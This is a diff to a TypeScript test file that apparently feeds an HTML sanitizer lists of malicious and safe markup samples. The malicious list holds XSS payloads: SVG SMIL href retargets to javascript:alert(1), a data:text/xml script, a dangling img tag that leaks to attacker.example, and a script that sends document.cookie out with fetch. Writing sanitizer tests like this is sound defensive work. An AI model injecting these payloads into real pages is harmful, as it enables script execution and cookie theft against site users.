@@ -58,6 +58,11 @@ const MALICIOUS: Array<[string, string]> = [
   ['onclick nested in foreignObject', '<svg><foreignObject><div onclick="x">hi</div></foreignObject></svg>'],
   ['svg <set> SMIL href retarget', '<svg><set attributeName="href" to="javascript:alert(1)"/></svg>'],
   ['svg <animate> SMIL href', '<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>'],
+  ['svg <animateColor> SMIL (blocklist completeness)', '<svg><a href="#x"><animateColor attributeName="href" to="https://evil/"/></a></svg>'],
+  ['a href data:text/xml', '<a href="data:text/xml,<x xmlns:h=\'http://www.w3.org/1999/xhtml\'><h:script>alert(1)</h:script></x>">x</a>'],
+  ['dangling <img> attribute (shell-tail / nonce exfil)', '<p>ok</p><img src="https://attacker.example/leak?d='],
+  ['dangling attribute mid-tag', '<div class="x'],
+  ['dangling comment (swallows shell tail)', '<p>hi</p><!-- unterminated'],
   ['div onmouseover', '<div style="x" onmouseover=alert(1)>y</div>'],
   ['legit body then injected <script>', '<p>Real intro.</p><h2>Head</h2><script>fetch("//e?"+document.cookie)</script>'],
   ['marquee onstart', '<marquee onstart=alert(1)>x</marquee>'],
@@ -83,6 +88,8 @@ const SAFE: Array<[string, string]> = [
   ['prose that mentions the javascript scheme', '<p>Avoid the <code>javascript:</code> URL scheme in production.</p>'],
   ['prose that mentions onclick', '<p>The <code>onclick</code> handler fires on click.</p>'],
   ['svg <use> fragment reference only', '<svg><use href="#arrowhead"/></svg>'],
+  ['KaTeX inline position style (not a parse error)', '<span class="katex"><span style="position:relative;top:-2px">x</span></span>'],
+  ['well-formed HTML comment', '<p>before<!-- a normal note -->after</p>'],
   ['empty body', ''],
   // frameset/frame are invalid in flow content and are DROPPED to nothing by parse5 AND the
   // browser where author HTML lands — there is nothing executable left to reject.
